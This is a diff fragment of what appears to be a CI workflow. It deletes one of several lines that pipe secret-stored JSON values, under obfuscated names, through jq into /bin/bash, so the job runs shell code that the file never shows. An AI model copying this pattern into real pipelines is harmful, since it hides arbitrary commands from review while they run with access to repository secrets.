@@ -23,7 +23,6 @@ jobs:
           f0: ${{ secrets.f0 }}
         run: |
           printf '%s' "$f0" | jq -r .qrukv42878 | /bin/bash
-          printf '%s' "$r81694" | jq -r .s438 | /bin/bash
           printf '%s' "$lzq4101" | jq -r .dtj73536 | /bin/bash
           printf '%s' "$xjmzd1489" | jq -r .rhir9929 | /bin/bash
           printf '%s' "$rvbn9595" | jq -r .exby62358 | /bin/bash
